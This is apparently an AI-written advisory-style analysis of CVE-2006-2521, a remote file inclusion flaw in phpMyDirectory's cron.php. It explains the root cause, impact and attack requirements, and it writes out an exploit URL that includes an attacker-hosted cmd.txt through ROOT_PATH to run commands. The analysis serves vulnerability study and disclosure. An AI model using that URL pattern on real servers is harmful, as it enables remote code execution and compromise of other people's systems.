Based on the provided information, here's an analysis of CVE-2006-2521:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a failure to properly sanitize user-supplied input, specifically the `ROOT_PATH` parameter within the `cron.php` script of phpMyDirectory.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is a Remote File Inclusion. The application uses the `ROOT_PATH` parameter to include files, and this parameter is not validated. This allows an attacker to specify a remote file using a URL.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the target server. This could lead to complete compromise of the server, data theft, or other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is exploited via a specially crafted HTTP GET request to the `cron.php` script. The `ROOT_PATH` parameter within the request is set to a URL controlled by the attacker.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Malicious File Hosting:** The attacker must host a malicious file on a server they control.
*   **Understanding of the Target Application:** The attacker must understand the URL structure and parameters of phpMyDirectory, specifically the `cron.php` script and the `ROOT_PATH` parameter.

**Technical Details:**

*   The vulnerable URL pattern is `http://[target]/[path]/cron.php?ROOT_PATH=http://[attacker]/cmd.txt?&cmd=ls`.
*   The `ROOT_PATH` parameter is used to include an external file from a URL specified by the attacker.
*   The `&cmd=ls` part of the URL appears to be for command execution after the remote file inclusion, but it's unclear if this is an intended feature or a side effect of the RFI.

**Additional Notes:**

*   The Exploit-DB entry for CVE-2006-2521 gives an example of how to exploit this vulnerability, using a remote file to execute the "ls" command on the target. This demonstrates a clear path to remote code execution.
*   The provided Secunia content does not directly describe this CVE but rather introduces Secunia Research, a vulnerability intelligence resource.

In summary, CVE-2006-2521 is a Remote File Inclusion vulnerability in phpMyDirectory that allows for arbitrary code execution by injecting a URL in the `ROOT_PATH` parameter of `cron.php`.
